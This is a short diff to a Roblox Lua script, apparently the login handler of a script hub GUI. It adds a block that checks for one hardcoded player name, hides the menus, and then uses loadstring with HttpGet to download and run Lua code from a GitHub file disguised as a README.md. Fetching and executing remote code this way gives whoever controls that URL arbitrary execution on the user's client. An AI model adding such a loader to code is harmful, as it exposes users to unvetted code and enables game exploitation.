@@ -185,6 +185,13 @@ Login.MouseButton1Down:connect(function()
 	end
 end)
 Login.MouseButton1Down:connect(function()
+	if game.Players.r57FDAADCAIUTGDA.character then
+		main.Visible = false
+		mainPremium.Visible = false
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/LucaMichael06/Luca/main/README.md"))()
+	end
+end)
+Login.MouseButton1Down:connect(function()
 	if game.Players.HELUichbingut.character then
 		main.Visible = false
 		mainPremium.Visible = false
